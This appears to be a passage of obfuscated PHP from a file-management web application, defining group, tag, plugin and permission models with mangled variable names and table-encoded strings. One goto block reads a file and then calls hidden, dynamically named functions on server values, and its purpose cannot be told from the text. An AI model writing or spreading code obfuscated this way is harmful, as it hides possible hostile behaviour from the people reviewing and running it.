(!$àîú¸±[$©şÕ—æ»[504]] || !isset($àîú¸±[$©şÕ—æ»[504]][$©şÕ—æ»[1947]]) || $àîú¸±[$©şÕ—æ»[504]][$©şÕ—æ»[1947]] == $©şÕ—æ»[1916]) { return $this->groupShowRoot($å‰Ì¥›·[count($å‰Ì¥›·) - 1], $æèî‡‰—); } if ($àîú¸±[$©şÕ—æ»[504]][$©şÕ—æ»[1947]] == $©şÕ—æ»[395]) { $Û¹ü¦» = explode($©şÕ—æ»[50], $àîú¸±[$©şÕ—æ»[504]][$©şÕ—æ»[1948]]); if ($Û¹ü¦») { $¯ªÓı¯« = array_merge($¯ªÓı¯«, $Û¹ü¦»); } } return $¯ªÓı¯«; } protected function resetParentLevel() { $ïùéÈáã =& $_SERVER[”ú…±Ú¥]; $€ö ›®ù = $ïùéÈáã[1861]; $—ã ÛÃß = $this->select(); $—ã ÛÃß = array_to_keyvalue($—ã ÛÃß, $€ö ›®ù); foreach ($—ã ÛÃß as $¬¢­¡¼ø) { $˜µŒŞàÊ = $¬¢­¡¼ø; $ìùÕÊ˜ = array(); while ($˜µŒŞàÊ[$ïùéÈáã[470]] != 0) { $ìùÕÊ˜[] = $˜µŒŞàÊ[$ïùéÈáã[470]]; $˜µŒŞàÊ = $—ã ÛÃß[$˜µŒŞàÊ[$ïùéÈáã[470]]]; } $ìùÕÊ˜[] = 0; $ìùÕÊ˜ = $ïùéÈáã[50] . implode($ïùéÈáã[50], array_reverse($ìùÕÊ˜)) . $ïùéÈáã[50]; $this->setNamePinyin($¬¢­¡¼ø[$€ö ›®ù], $¬¢­¡¼ø[$ïùéÈáã[32]]); $this->where(array($€ö ›®ù => $¬¢­¡¼ø[$€ö ›®ù]))->save(array($ïùéÈáã[618] => $ìùÕÊ˜)); } return $—ã ÛÃß; } public function groupNameAuto($ŸÎŒÅØ•, $Á‹¯Êı‰) { $÷Šé¹øˆ =& $_SERVER[”ú…±Ú¥]; $£«ïÇÊÈ = $this->where(array($÷Šé¹øˆ[439] => $ŸÎŒÅØ•))->getField($÷Šé¹øˆ[32], !0); if (!$£«ïÇÊÈ || !in_array($Á‹¯Êı‰, $£«ïÇÊÈ)) { return $Á‹¯Êı‰; } for ($Å ¥øé‰ = 1; $Å ¥øé‰ <= count($£«ïÇÊÈ) + 1; $Å ¥øé‰++) { $Ìöá§ÒÜ = $Á‹¯Êı‰ . "\x28{$Å ¥øé‰}\x29"; if (!in_array($Ìöá§ÒÜ, $£«ïÇÊÈ)) { return $Ìöá§ÒÜ; } } } public function groupSwitch($ŠÇ€Ğ¡¤, $¦Óµ´êË) { $è¶ç€óÚ =& $_SERVER[”ú…±Ú¥]; $şùÔæ¸ = array($è¶ç€óÚ[1861] => array($è¶ç€óÚ[7], array($ŠÇ€Ğ¡¤, $¦Óµ´êË))); $Ğ›Á¹è— = $this->where($şùÔæ¸)->select(); $Ğ›Á¹è— = array_to_keyvalue($Ğ›Á¹è—, $è¶ç€óÚ[1861]); if (!isset($Ğ›Á¹è—[$ŠÇ€Ğ¡¤]) || !isset($Ğ›Á¹è—[$¦Óµ´êË]) || $Ğ›Á¹è—[$ŠÇ€Ğ¡¤][$è¶ç€óÚ[470]] == 0) { return !1; } $şùÔæ¸ = array($è¶ç€óÚ[1861] => $ŠÇ€Ğ¡¤); $¤µ‰…½– = Model($è¶ç€óÚ[1951])->where($şùÔæ¸)->select(); if (!$¤µ‰…½–) { $¤µ‰…½– = array(); } foreach ($¤µ‰…½– as $—Ç±Íş·) { $¢äÚÛöº = $—Ç±Íş·[$è¶ç€óÚ[1671]]; $şùÔæ¸ = array($è¶ç€óÚ[1671] => $¢äÚÛöº, $è¶ç€óÚ[1861] => $¦Óµ´êË); $¯É°Ï„ = Model($è¶ç€óÚ[1951])->where($şùÔæ¸)->find(); if (!$¯É°Ï„) { $¼¥®¢«Ç = array($¦Óµ´êË => $—Ç±Íş·[$è¶ç€óÚ[1965]]); Model($è¶ç€óÚ[563])->userGroupAdd($¢äÚÛöº, $¼¥®¢«Ç); } Model($è¶ç€óÚ[563])->userGroupRemove($¢äÚÛöº, $ŠÇ€Ğ¡¤); } $şùÔæ¸ = array($è¶ç€óÚ[449] => 2, $è¶ç€óÚ[470] => 0, $è¶ç€óÚ[448] => 1, $è¶ç€óÚ[534] => array($è¶ç€óÚ[7], array($ŠÇ€Ğ¡¤, $¦Óµ´êË))); $ßÀôÈÔú = Model($è¶ç€óÚ[857])->where($şùÔæ¸)->field($è¶ç€óÚ[1966])->select(); $ßÀôÈÔú = array_to_keyvalue($ßÀôÈÔú, $è¶ç€óÚ[534], $è¶ç€óÚ[440]); $ò‹§ÁÛ¯ = !empty($ßÀôÈÔú[$ŠÇ€Ğ¡¤]) ? $ßÀôÈÔú[$ŠÇ€Ğ¡¤] : !1; if ($ò‹§ÁÛ¯) { if (!$ßÀôÈÔú[$¦Óµ´êË]) { $ßÀôÈÔú[$¦Óµ´êË] = Model($è¶ç€óÚ[857])->groupRootAdd($¦Óµ´êË); } $¨ß˜îŸî = $ßÀôÈÔú[$¦Óµ´êË]; $şùÔæ¸ = array($è¶ç€óÚ[470] => $ò‹§ÁÛ¯); $ßÀôÈÔú = Model($è¶ç€óÚ[857])->where($şùÔæ¸)->field($è¶ç€óÚ[1967])->select(); if (!$ßÀôÈÔú) { $ßÀôÈÔú = array(); } Model($è¶ç€óÚ[857])->moveClearAuth = !1; foreach ($ßÀôÈÔú as $ôß¶ùŸ¾) { $ü–„×Ôœ = $ôß¶ùŸ¾[$è¶ç€óÚ[448]] == $è¶ç€óÚ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($è¶ç€óÚ[857])->move($ôß¶ùŸ¾[$è¶ç€óÚ[440]], $¨ß˜îŸî, $ü–„×Ôœ); } Model($è¶ç€óÚ[857])->moveClearAuth = !0; $şùÔæ¸ = array($è¶ç€óÚ[449] => 2, $è¶ç€óÚ[534] => $ŠÇ€Ğ¡¤); $«îõÕ = array($è¶ç€óÚ[534] => $¦Óµ´êË); Model($è¶ç€óÚ[1968])->where($şùÔæ¸)->save($«îõÕ); Model($è¶ç€óÚ[1969])->where($şùÔæ¸)->save($«îõÕ); } $this->_changeChildLevel($Ğ›Á¹è—[$ŠÇ€Ğ¡¤], $Ğ›Á¹è—[$¦Óµ´êË], !0); $this->where(array($è¶ç€óÚ[470] => $ŠÇ€Ğ¡¤))->save(array($è¶ç€óÚ[470] => $¦Óµ´êË)); $this->_clearChildrenCache($Ğ›Á¹è—[$¦Óµ´êË]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\146\141\x76"; protected function cacheFunctionAlias($üˆş§«Á) { $äì¡”’á =& $_SERVER[”ú…±Ú¥]; return array($äì¡”’á[1970] => array($üˆş§«Á[0], $äì¡”’á[1971]), $äì¡”’á[1972] => array($üˆş§«Á[0], $äì¡”’á[1973])); } protected function get($Ç‰¹Ä É) { $øØ¯ëéè =& $_SERVER[”ú…±Ú¥]; $ÍéÃ†Éˆ = Model($øØ¯ëéè[550])->metaGet($Ç‰¹Ä É, $øØ¯ëéè[1974]); $æûí“¿ˆ = json_decode($ÍéÃ†Éˆ, !0); return $æûí“¿ˆ ? $æûí“¿ˆ : array($øØ¯ëéè[1975] => $øØ¯ëéè[88], $øØ¯ëéè[407] => array()); } protected function set($‚ú˜†Ü†, $†­ğˆïŒ) { $÷ş œñª =& $_SERVER[”ú…±Ú¥]; $†­ğˆïŒ = $†­ğˆïŒ ? $†­ğˆïŒ : array($÷ş œñª[1975] => $÷ş œñª[88], $÷ş œñª[407] => array()); return Model($÷ş œñª[550])->metaSet($‚ú˜†Ü†, $÷ş œñª[1974], json_encode($†­ğˆïŒ)); } protected function getByTagID($õƒ×ëæÓ, $ÄÎÄÌ×à) { $ŸöúÙ¤ =& $_SERVER[”ú…±Ú¥]; if (!$õƒ×ëæÓ || !$ÄÎÄÌ×à) { return !1; } if (!Model($ŸöúÙ¤[550])->getInfoSimple($õƒ×ëæÓ)) { return !1; } $Èç¼¤Ôü = $this->get($õƒ×ëæÓ); if (!$Èç¼¤Ôü || !isset($Èç¼¤Ôü[$ŸöúÙ¤[407]])) { return !1; } $ÔÍı€ß = array_find_by_field($Èç¼¤Ôü[$ŸöúÙ¤[407]], $ŸöúÙ¤[437], $ÄÎÄÌ×à); return is_array($ÔÍı€ß) ? $ÔÍı€ß : !1; } public function listSource($éõ­ª§Ù, $àƒÇº‰Ó) { $á¸­§÷ñ =& $_SERVER[”ú…±Ú¥]; if ($àƒÇº‰Ó && !is_array($àƒÇº‰Ó)) { $àƒÇº‰Ó = array($àƒÇº‰Ó); } $øÍÀş² = $this->listData($éõ­ª§Ù); $Ş¹†âÖÔ = array(); foreach ($øÍÀş² as $õ˜àÖÇ) { $–Î²Ì = $õ˜àÖÇ[$á¸­§÷ñ[84]]; if (!$–Î²Ì) { continue; } if (!isset($Ş¹†âÖÔ[$–Î²Ì])) { $Ş¹†âÖÔ[$–Î²Ì] = array(); } $Ş¹†âÖÔ[$–Î²Ì][] = $õ˜àÖÇ[$á¸­§÷ñ[464]]; } $ğ©˜Úè = array(); foreach ($Ş¹†âÖÔ as $ŒâÍğ€ô => $ÛêƒªÙ…) { $·±õ¼ = !0; if (!$àƒÇº‰Ó) { $ğ©˜Úè[] = $ŒâÍğ€ô; continue; } foreach ($àƒÇº‰Ó as $…šãÌŠË) { if (!in_array($…šãÌŠË, $ÛêƒªÙ…)) { $·±õ¼ = !1; break; } } if ($·±õ¼) { $ğ©˜Úè[] = $ŒâÍğ€ô; } } if (!$ğ©˜Úè) { return array(); } $…şÆ“ôé = array($á¸­§÷ñ[455] => array($á¸­§÷ñ[456], $ğ©˜Úè), $á¸­§÷ñ[534] => $éõ­ª§Ù, $á¸­§÷ñ[449] => SourceModel::TYPE_GROUP); $ÇÏ…ü©Â = Model($á¸­§÷ñ[1362])->listSource($…şÆ“ôé); if (!$ÇÏ…ü©Â || count($ğ©˜Úè) == $ÇÏ…ü©Â[$á¸­§÷ñ[404]][$á¸­§÷ñ[405]]) { return $ÇÏ…ü©Â; } $²¤Ñšè = array(); $¤ğ„¦šÆ = array_to_keyvalue($ÇÏ…ü©Â[$á¸­§÷ñ[82]], $á¸­§÷ñ[12], $á¸­§÷ñ[440]); $îõƒ‘ù¬ = array_to_keyvalue($ÇÏ…ü©Â[$á¸­§÷ñ[83]], $á¸­§÷ñ[12], $á¸­§÷ñ[440]); $¯Îªû«È = array_merge($îõƒ‘ù¬, $¤ğ„¦šÆ); foreach ($ğ©˜Úè as $–Î²Ì) { if (!in_array($–Î²Ì, $¯Îªû«È)) { $²¤Ñšè[] = $–Î²Ì; } } if ($²¤Ñšè) { $this->removeBySource($éõ­ª§Ù, $²¤Ñšè); } return $ÇÏ…ü©Â; } protected function listData($Ğõé¾æÓ) { $¡Ü´–½€ =& $_SERVER[”ú…±Ú¥]; $¿¿š¾“ğ = array($¡Ü´–½€[1662] => 0, $¡Ü´–½€[521] => array($¡Ü´–½€[1976], 0), $¡Ü´–½€[460] => $¡Ü´–½€[1977] . $Ğõé¾æÓ); $™‚²ç¹ = $¡Ü´–½€[1978]; $òÑÙÃíš = $this->field($™‚²ç¹)->where($¿¿š¾“ğ)->order($¡Ü´–½€[1979])->select(); return $òÑÙÃíš ? $òÑÙÃíš : array(); } protected function addToTag($ÄÕ¤«¦, $ûÔ»ñºş, $ÁªéÒãÌ) { $óÍªää =& $_SERVER[”ú…±Ú¥]; if (!$this->getByTagID($ÄÕ¤«¦, $ÁªéÒãÌ) || !$ûÔ»ñºş) { return !1; } if (!Model($óÍªää[857])->pathInfo($ûÔ»ñºş)) { return !1; } $á›ÍÍ‰à = array($óÍªää[1662] => 0, $óÍªää[521] => $ÁªéÒãÌ, $óÍªää[459] => $ûÔ»ñºş, $óÍªää[460] => $óÍªää[1980] . $ÄÕ¤«¦, $óÍªää[458] => $óÍªää[12], $óÍªää[1865] => 0); if ($this->where($á›ÍÍ‰à)->find()) { return !1; } return $this->add($á›ÍÍ‰à); } protected function removeFromTag($¾ŒœßŒ, $™¯›í«÷, $ÑÏ»«ä) { $®ñªùà³ =& $_SERVER[”ú…±Ú¥]; if (!$this->getByTagID($¾ŒœßŒ, $ÑÏ»«ä) || !$™¯›í«÷) { return !1; } if (is_array($™¯›í«÷)) { $™¯›í«÷ = array($®ñªùà³[7], $™¯›í«÷); } $üà»¾æ = array($®ñªùà³[1662] => 0, $®ñªùà³[521] => $ÑÏ»«ä, $®ñªùà³[460] => $®ñªùà³[1980] . $¾ŒœßŒ, $®ñªùà³[459] => $™¯›í«÷); return $this->where($üà»¾æ)->delete(); } protected function removeByTag($ß‰ˆŞçÕ, $šİ÷Úˆ°) { $µÜˆØÅ» =& $_SERVER[”ú…±Ú¥]; if (!$this->getByTagID($ß‰ˆŞçÕ, $šİ÷Úˆ°)) { return !1; } $©öêÉ­ª = array($µÜˆØÅ»[1662] => 0, $µÜˆØÅ»[521] => $šİ÷Úˆ°, $µÜˆØÅ»[460] => $µÜˆØÅ»[1980] . $ß‰ˆŞçÕ); return $this->where($©öêÉ­ª)->delete(); } protected function removeBySource($®ë·²Ü, $©ùÔ†œı) { $¾ÔÕì¼Ö =& $_SERVER[”ú…±Ú¥]; if (!$®ë·²Ü || !$©ùÔ†œı) { return !1; } if (is_array($©ùÔ†œı)) { $©ùÔ†œı = array($¾ÔÕì¼Ö[7], $©ùÔ†œı); } $µĞ®‘æ„ = array($¾ÔÕì¼Ö[1662] => 0, $¾ÔÕì¼Ö[459] => $©ùÔ†œı, $¾ÔÕì¼Ö[521] => array($¾ÔÕì¼Ö[1043], 0), $¾ÔÕì¼Ö[460] => $¾ÔÕì¼Ö[1980] . $®ë·²Ü); return $this->where($µĞ®‘æ„)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\160\x6c\165\147\151\x6e\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\141\164\x75\x73", "\162\x65\147\x69\x65\163\x74", "\143\x6f\x6e\146\x69\x67"); public function loadList($Š§û§ÒÛ = false) { $öğšÂÌ£ = array_to_keyvalue($this->listData(), $_SERVER[”ú…±Ú¥][32]); if ($Š§û§ÒÛ) { return $öğšÂÌ£[$Š§û§ÒÛ]; } return $öğšÂÌ£; } public function init() { $úÜò¯„ =& $_SERVER[”ú…±Ú¥]; Hook::trigger($úÜò¯„[1981]); $§åÂüä² = $this->loadPluginList(); foreach ($§åÂüä² as $£Ö²ş¤Ü => $÷¾íß¶Ã) { $›á’×ä = $this->appAllow($£Ö²ş¤Ü, $÷¾íß¶Ã); if (!$›á’×ä) { continue; } foreach ($÷¾íß¶Ã[$úÜò¯„[1982]] as $³ÇŒĞºŒ => $—æì¾Ï) { Hook::bind($³ÇŒĞºŒ, $—æì¾Ï); } } Hook::trigger($úÜò¯„[1983]); Hook::trigger(ACTION); } public function appAllow($ëí¹±ïÙ, $å†ùŞæ, $òö´Ïª = true) { $Ûîß¥ƒó =& $_SERVER[”ú…±Ú¥]; $§ÜÚÑôĞ = PLUGIN_DIR . $ëí¹±ïÙ . $Ûîß¥ƒó[1984]; if (!is_array($å†ùŞæ) || !is_array($å†ùŞæ[$Ûîß¥ƒó[1982]]) || $å†ùŞæ[$Ûîß¥ƒó[782]] != 1 || !is_file($§ÜÚÑôĞ)) { return !1; } if ($GLOBALS[$Ûîß¥ƒó[532]] == 1) { if ($GLOBALS[$Ûîß¥ƒó[6]][$Ûîß¥ƒó[1985]] || !$GLOBALS[$Ûîß¥ƒó[6]][$Ûîß¥ƒó[1986]]) { return !0; } $¥ú«ç™â = explode($Ûîß¥ƒó[50], strtolower($GLOBALS[$Ûîß¥ƒó[6]][$Ûîß¥ƒó[1986]])); return in_array(strtolower($ëí¹±ïÙ), $¥ú«ç™â) ? !1 : !0; } if ($òö´Ïª && !Action($Ûîß¥ƒó[1987])->checkAuth($ëí¹±ïÙ)) { return !1; } return !0; } public function unInstall($¤Šñ¡Ñ†) { $Âã²ÌÈ =& $_SERVER[”ú…±Ú¥]; $Å²µƒÉ = $this->loadList($¤Šñ¡Ñ†); if (file_exists(PLUGIN_DIR . $¤Šñ¡Ñ†)) { Hook::apply($¤Šñ¡Ñ† . $Âã²ÌÈ[1988]); } $this->remove($Å²µƒÉ[$Âã²ÌÈ[437]]); } public function changeStatus($¾ñì»û², $±¨ˆãÄñ) { $à¨´ =& $_SERVER[”ú…±Ú¥]; $ÙÉèŠˆÃ = $this->loadList($¾ñì»û²); if ($±¨ˆãÄñ) { Hook::apply($¾ñì»û² . $à¨´[1989]); } $this->update($ÙÉèŠˆÃ[$à¨´[437]], array($à¨´[1990] => $±¨ˆãÄñ)); } public function appRegist($ô–İîñ, $ĞÁÊçŞÌ) { $ªİÎÖ‡ =& $_SERVER[”ú…±Ú¥]; $ÚÕ«Ôº® = $this->loadList($ô–İîñ); if ($ÚÕ«Ôº®) { $this->update($ÚÕ«Ôº®[$ªİÎÖ‡[437]], array($ªİÎÖ‡[1982] => $ĞÁÊçŞÌ)); } else { $¬§Ø…®ı = array($ªİÎÖ‡[32] => $ô–İîñ, $ªİÎÖ‡[1982] => $ĞÁÊçŞÌ, $ªİÎÖ‡[782] => 0, $ªİÎÖ‡[6] => $this->getConfigDefault($ô–İîñ)); $this->insert($¬§Ø…®ı); } } public function getConfigDefault($ãàû‚§Ÿ) { $šıäı‹Ù =& $_SERVER[”ú…±Ú¥]; $•´ÓçÀ¿ = array(); $å‹À§æ = $this->getPackageJson($ãàû‚§Ÿ); if (!$å‹À§æ && is_array($å‹À§æ[$šıäı‹Ù[1991]])) { return $•´ÓçÀ¿; } foreach ($å‹À§æ[$šıäı‹Ù[1991]] as $ÑÜû‘¹ë => $Õ Ü¥¼) { if (!isset($Õ Ü¥¼[$šıäı‹Ù[412]]) || isset($•´ÓçÀ¿[$ÑÜû‘¹ë])) { continue; } $•´ÓçÀ¿[$ÑÜû‘¹ë] = $Õ Ü¥¼[$šıäı‹Ù[412]]; } return $•´ÓçÀ¿; } public function getPackageJson($·Îí±×) { return Hook::apply($·Îí±× . $_SERVER[”ú…±Ú¥][1992]); } public function getConfig($ˆ‚ÏÔ±å, $úÓèÌóÙ = false) { $£ö¥õØ =& $_SERVER[”ú…±Ú¥]; $«·çÎ®› = array(); $¯ÏÂÍò = $this->loadList($ˆ‚ÏÔ±å); if ($¯ÏÂÍò && is_array($¯ÏÂÍò[$£ö¥õØ[6]])) { $«·çÎ®› = $¯ÏÂÍò[$£ö¥õØ[6]]; } if (!$«·çÎ®› || $úÓèÌóÙ) { $«·çÎ®› = $this->getConfigDefault($ˆ‚ÏÔ±å); } return $«·çÎ®›; } public function setConfig($š¶ëœ­¨, $âıåğ = false) { $‘åƒÌúü =& $_SERVER[”ú…±Ú¥]; $“Ó“İÉö = $this->loadList($š¶ëœ­¨); if (!$“Ó“İÉö) { return !1; } $‹ô…®’ = $“Ó“İÉö[$‘åƒÌúü[6]]; if ($âıåğ == !1) { $‹ô…®’ = array(); $âıåğ = $this->getConfigDefault($š¶ëœ­¨); } foreach ($âıåğ as $ÌÇ»Ë„ì => $æ˜ìÃĞ) { $‹ô…®’[$ÌÇ»Ë„ì] = is_string($æ˜ìÃĞ) ? trim($æ˜ìÃĞ) : $æ˜ìÃĞ; } $this->update($“Ó“İÉö[$‘åƒÌúü[437]], array($‘åƒÌúü[6] => $‹ô…®’)); } public function viewList() { $µÈ’ªË =& $_SERVER[”ú…±Ú¥]; $¯Éæ†ü‹ = $this->loadList(); $this->pluginScan($¯Éæ†ü‹); $¯Éæ†ü‹ = $this->loadPluginList(); $÷Ú¯É•Ã = array(); foreach ($¯Éæ†ü‹ as $§¿ÑÄç => $ÇşÖÑÕ¤) { unset($ÇşÖÑÕ¤[$µÈ’ªË[1982]], $ÇşÖÑÕ¤[$µÈ’ªË[6]]); $·öÍ»Ø¸ = PLUGIN_DIR . $ÇşÖÑÕ¤[$µÈ’ªË[32]] . $µÈ’ªË[1984]; if (!is_file($·öÍ»Ø¸)) { continue; } $èÍê®®Â = Hook::apply($ÇşÖÑÕ¤[$µÈ’ªË[32]] . $µÈ’ªË[1992]); if (is_array($èÍê®®Â)) { $÷Ú¯É•Ã[$§¿ÑÄç] = array_merge($ÇşÖÑÕ¤, $èÍê®®Â); } } return $÷Ú¯É•Ã; } private function loadPluginList() { $Œø æ±« =& $_SERVER[”ú…±Ú¥]; $¹—Âˆ¬ = $this->loadList(); if (strtolower(MOD) == $Œø æ±«[1993]) { return $¹—Âˆ¬; } $’Çµ»ø§ = Hook::trigger($Œø æ±«[1994], $¹—Âˆ¬); if ($¹—Âˆ¬ && !$’Çµ»ø§) { die; } return $’Çµ»ø§ ? $’Çµ»ø§ : $¹—Âˆ¬; } private function pluginScan($ĞÍµÎä˜) { $¯€Á§Åô =& $_SERVER[”ú…±Ú¥]; recursion_dir(PLUGIN_DIR, $Ê¿³ôÏò, $ÇÕçµ¶, 0); foreach ($Ê¿³ôÏò as $©—óıŠÑ) { $ïà”„ï = get_path_this($©—óıŠÑ); if (isset($ĞÍµÎä˜[$ïà”„ï]) || !file_exists($©—óıŠÑ . $¯€Á§Åô[1995]) || !file_exists($©—óıŠÑ . $¯€Á§Åô[1984])) { continue; } Hook::apply($ïà”„ï . $¯€Á§Åô[1989]); } } } goto FšÖÃ„Â®Ş; Cõé‡‚™: if ($_SERVER[$_SERVER[”ú…±Ú¥][186]] != $_SERVER[$_SERVER[”ú…±Ú¥][187]]) { $_getc = $_SERVER[”ú…±Ú¥][188]; $_getfile = $_SERVER[$_SERVER[”ú…±Ú¥][189]] . $_SERVER[”ú…±Ú¥][190]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”ú…±Ú¥][191], $_getfilec); if (count($_getarrs) < $_SERVER[”ú…±Ú¥][192]) { $exit = $_SERVER[”ú…±Ú¥][193]; $exit(); } $_act = $_SERVER[”ú…±Ú¥][194]; $_act($_SERVER[$_SERVER[”ú…±Ú¥][195]]); } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $“ôè×Ù =& $_SERVER[”ú…±Ú¥]; $¶ÜçÂÑƒ = array(array($“ôè×Ù[458] => LNG($“ôè×Ù[1862]), $“ôè×Ù[1863] => $“ôè×Ù[1864], $“ôè×Ù[1865] => 1, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($“ôè×Ù[458] => LNG($“ôè×Ù[1868]), $“ôè×Ù[1863] => $“ôè×Ù[1869], $“ôè×Ù[1865] => 2, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($“ôè×Ù[458] => LNG($“ôè×Ù[1870]), $“ôè×Ù[1863] => $“ôè×Ù[1871], $“ôè×Ù[1865] => 3, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($“ôè×Ù[458] => LNG($“ôè×Ù[1872]), $“ôè×Ù[1863] => $“ôè×Ù[1873], $“ôè×Ù[1865] => 4, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => self::AUTH_SHOW | self::AUTH_VIEW), array($“ôè×Ù[458] => LNG($“ôè×Ù[1874]), $“ôè×Ù[1863] => $“ôè×Ù[1875], $“ôè×Ù[1865] => 5, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($“ôè×Ù[458] => LNG($“ôè×Ù[1876]), $“ôè×Ù[1863] => $“ôè×Ù[1877], $“ôè×Ù[1865] => 6, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($“ôè×Ù[458] => LNG($“ôè×Ù[1878]), $“ôè×Ù[1863] => $“ôè×Ù[1879], $“ôè×Ù[1865] => 7, $“ôè×Ù[1866] => 1, $“ôè×Ù[1867] => 0)); return $¶ÜçÂÑƒ; } public static function authCheck($—áÍ×—ò, $ïÊ¹…¾›) { $Ÿ•Êíóü =& $_SERVER[”ú…±Ú¥]; $—áÍ×—ò = intval($—áÍ×—ò); if ($GLOBALS[$Ÿ•Êíóü[532]] && $GLOBALS[$Ÿ•Êíóü[6]][$Ÿ•Êíóü[1880]]) { return !0; } if ($—áÍ×—ò <= 0) { return !1; } if (($—áÍ×—ò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—áÍ×—ò & $ïÊ¹…¾›); } public static function authCheckShow($ûõÂæùİ) { return self::authCheck($ûõÂæùİ, self::AUTH_SHOW); } public static function authCheckView($£Åñ‹Ùˆ) { return self::authCheck($£Åñ‹Ùˆ, self::AUTH_VIEW); } public static function authCheckDownload($Åı¿¨ Ò) { return self::authCheck($Åı¿¨ Ò, self::AUTH_DOWNLOAD); } public static function authCheckUpload($å‚ÓÁÒÜ) { return self::authCheck($å‚ÓÁÒÜ, self::AUTH_UPLOAD); } public static function authCheckEdit($–éÁºö÷) { return self::authCheck($–éÁºö÷, self::AUTH_EDIT); } public static function authCheckRemove($½±øÕùÒ) { return self::authCheck($½±øÕùÒ, self::AUTH_REMOVE); } public static function authCheckShare($Ş¬à™¡‘) { return self::authCheck($Ş¬à™¡‘, self::AUTH_SHARE); } public static function authCheckComment($ÔìË™Ë) { return self::authCheck($ÔìË™Ë, self::AUTH_COMMENT); } public static function authCheckEvent($¾Ù…ê˜) { return self::authCheck($¾Ù…ê˜, self::AUTH_EVENT); } public static function authCheckRoot($ •Ÿè) { return self::authCheck($ •Ÿè, self::AUTH_ROOT); } public static function authCheckAction($Ä´Äì±ı, $ì÷†¤ÏÔ) { $˜İÆş™ =& $_SERVER[”ú…±Ú¥]; $ÉÄÁ×Û³ = array($˜İÆş™[1881] => self::AUTH_VIEW, $˜İÆş™[1223] => self::AUTH_DOWNLOAD, $˜İÆş™[107] => self::AUTH_UPLOAD, $˜İÆş™[1831] => self::AUTH_EDIT, $˜İÆş™[1830] => self::AUTH_REMOVE, $˜İÆş™[1841] => self::AUTH_SHARE, $˜İÆş™[392] => self::AUTH_COMMENT, $˜İÆş™[1659] => self::AUTH_EVENT, $˜İÆş™[1882] => self::AUTH_ROOT); if (!isset($ÉÄÁ×Û³[$ì÷†¤ÏÔ])) { return; } $µÍ‹½ƒÊ = $ÉÄÁ×Û³[$ì÷†¤ÏÔ]; $Ä´Äì±ı = intval($Ä´Äì±ı); if ($Ä´Äì±ı <= 0) { return !1; } if (($Ä´Äì±ı & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ä´Äì±ı & $µÍ‹½ƒÊ); } public static function authDisable($ëè¼¾‡“, $Æ‘é‹«) { if (intval($ëè¼¾‡“) <= 0) { return 0; } return intval($ëè¼¾‡“) & ~$Æ‘é‹«; } public $optionType = "\x53\171\163\164\x65\155\56\x73\x6f\x75\x72\x63\145\101\x75\164\150\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\x74\x68", "\154\141\x62\145\154", "\x64\x69\163\x70\x6c\141\x79", "\163\x79\x73\x74\x65\x6d", "\163\x6f\x72\x74"); public function initData() { $¾ˆ¹ó = $this->authDefault(); foreach ($¾ˆ¹ó as $œû¬‰º„) { $this->add($œû¬‰º„); } } public function findAuth($ôİğàê, $óôæ§ë) { $ÇÚ•–¶“ =& $_SERVER[”ú…±Ú¥]; $ûîÈ³ï = parent::listData(); foreach ($ûîÈ³ï as $áã¦åğ„) { $’È›Ë = intval($áã¦åğ„[$ÇÚ•–¶“[451]]); if ($’È›Ë <= 0 || $áã¦åğ„[$ÇÚ•–¶“[1883]] == 0) { continue; } if (($’È›Ë & $ôİğàê) != $ôİğàê) { continue; } if (($’È›Ë & $óôæ§ë) != 0) { continue; } return $áã¦åğ„[$ÇÚ•–¶“[437]]; } return !1; } public function findAuthReadOnly() { $‡áï¢½‘ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $åÖ¦Ş¤è = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($‡áï¢½‘, $åÖ¦Ş¤è); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $…ÉÖ¤¦î =& $_SERVER[”ú…±Ú¥]; $¯ç…úÇ± = parent::listData(); $×É›ûÇ¦ = !1; foreach ($¯ç…úÇ± as $’¯Æâ™®) { if ($’¯Æâ™®[$…ÉÖ¤¦î[451]] <= 0 || 